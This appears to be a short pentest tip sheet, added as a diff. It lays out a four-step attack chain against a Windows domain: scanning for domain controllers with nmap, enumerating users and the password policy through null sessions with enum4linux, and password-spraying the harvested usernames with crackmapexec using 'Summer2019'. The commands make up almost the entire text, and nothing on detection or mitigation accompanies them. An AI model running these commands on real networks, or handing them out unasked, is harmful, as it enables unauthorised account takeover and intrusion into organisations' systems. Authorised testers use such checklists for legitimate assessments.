@@ -1,0 +1,9 @@
+Everything patched? Good baselines? Find NULL Sessions!
+1) Find your DC's
+nmap -sS -p3268,3269 -iL subnets.txt
+2) Enumerate Users
+enum4linux -U 192.168.x.x
+3) Pull Password Policy
+enum4linux -P 192.168.x.x
+4) Password Spray Usernames
+cme smb 192.168.x.x -u users.txt -p Summer2019
